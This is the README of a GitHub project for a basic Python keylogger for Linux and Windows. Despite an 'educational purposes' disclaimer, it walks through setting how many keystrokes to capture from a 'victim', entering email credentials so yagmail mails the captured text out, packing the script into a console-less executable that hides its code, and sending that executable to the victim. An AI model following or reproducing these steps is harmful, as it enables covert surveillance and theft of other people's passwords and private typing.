# keylogger
Basic keylogger for Linux and Windows

# Disclaimer
```
Do not use this program for black hat purposes
The program created just for educational purposes
```
# how-to-install
Clone the repository
```
git clone https://github.com/Cli3nt-ctrl/keylogger/
```
Change the directory
```
cd keylogger
```
Install the reuired python libraries
```
pip3 install requirements.txt
```

# how-to-use
open keylogger.py and enter the number of letters you wanna capture through victim
```
Enter the numbers here in the if loop :-- if len(a)==10 (default value is set as 10)
```
Enter your email id and password here
```
yagmail.SMTP(user='',password='')
```
Using the pyinstaller is optional. Pyinstaller creates your python file into executable format (.exe in  Windows and .elf in Linux) which also makes your python file unreadable
```
pyinstaller keylogger.py --no-console --onefile 
```
Your executable file will be in dist folder
```
cd dist
```
Send the executable file to your victim
